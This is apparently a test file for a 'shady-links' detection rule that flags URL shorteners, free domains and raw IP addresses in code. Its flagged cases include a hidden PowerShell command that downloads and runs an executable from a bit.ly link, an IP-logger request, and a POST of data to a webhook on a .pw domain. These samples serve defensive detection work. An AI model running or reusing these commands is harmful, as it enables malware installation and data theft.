""" Tests for shady-links rule

    OK cases:
      - common/paid domain extensions
        - urls with free domain extensions in other parts of link
      - urls nested within data structures, comments, etc.
    RULEID cases:
      - free domain extensions
      - url shorteners
"""


""" OK: random urls with common/paid domain extensions
"""
# ok: shady-links
goodlink1 = "http://google.com:5000/v1.0/"

# ok: shady-links
goodlink2 = "https://id.atlassian.com/login?continue=https%3A%2F%2Fstart.atlassian.com%2F&application=start"

# ok: shady-links
goodlink1 = "http://xn--n3h.net//"


""" OK: urls with free domain extensions in other parts of link
"""
# ok: shady-links
"https://lov.linkeddata.es/dataset/lov/api/v2/vocabulary/autocomplete?q=%s'%vocab"

# todook: shady-links
"""
How about links in long comments?
# todook: shady-links
ref:http://bit.ly/2gK6bXK
"""

""" OK: urls nested within data structures, comments, etc.
"""
# ok: shady-links
SECURE_ORIGINS: List[SecureOrigin] = [
    # protocol, hostname, port\n
    # Taken from Chrome\'s list of secure origins (See: http://bit.ly/1qrySKC)
    ("https", "*", "*"),
    ("*", "localhost", "*"),
    ("*", "127.0.0.0/8", "*"),
    ("*", "::1/128", "*"),
    ("file", "*", None),
    # ssh is always secure.
    ("ssh", "*", "*"),
]


""" RULEID: url shorteners
"""
os.system(
    # ruleid: shady-links
    "powershell -window hidden -executionpolicy bypass (New-object system.net.webclient).DownloadFile('http://bit.ly/2myCV9n',$env:APPDATA+'\Main.exe'); Start-Process $env:APPDATA'\Main.exe'"
)


""" RULEID: free domain extensions
"""

# ruleid: shady-links
req = urllib3.Request("https://grabify.link/E09EIF", headers={"User-Agent": os})

""" RULEID: IPv4
"""

# ruleid: shady-links
req = urllib3.Request("https://127.0.0.1/foo.exe", headers={"User-Agent": os})

# ruleid: shady-links
req = urllib3.Request("https://root@1.2.3.4", headers={"User-Agent": os})

# ruleid: shady-links
req = urllib3.Request("https://root@12.34.56.78:42", headers={"User-Agent": os})

# ruleid: shady-links
req = urllib3.Request("https://root@123.234.156.178", headers={"User-Agent": os})

# ruleid: shady-links
req = urllib3.Request("https://root:pw@127.0.0.1", headers={"User-Agent": os})

""" RULEID: IPv6
"""

# ruleid: shady-links
req = urllib3.Request("https://[::1]/foo.exe", headers={"User-Agent": os})

# ruleid: shady-links
req = urllib3.Request("https://[::abcd:1]:42", headers={"User-Agent": os})

# ruleid: shady-links
req = urllib3.Request("https://[12aB::1]", headers={"User-Agent": os})

# ruleid: shady-links
req = urllib3.Request("https://[12ab:12AB:12ab:12BA:12ab:12Ab:12aB:12Ab]", headers={"User-Agent": os})

# ruleid: shady-links
req = urllib3.Request("https://root@[1234:AbCd:1234::fedc:1]", headers={"User-Agent": os})

# ruleid: shady-links
req = urllib3.Request("https://root:pw@[::1]", headers={"User-Agent": os})

# todoruleid: shady-links
request(
    # todoruleid: shady-links
    url="http://us.dslab.pw/webhook.php",
    method="POST",
    data=json.dumps(data).encode("utf-8", errors="ignore"),
    headers=headers,
)
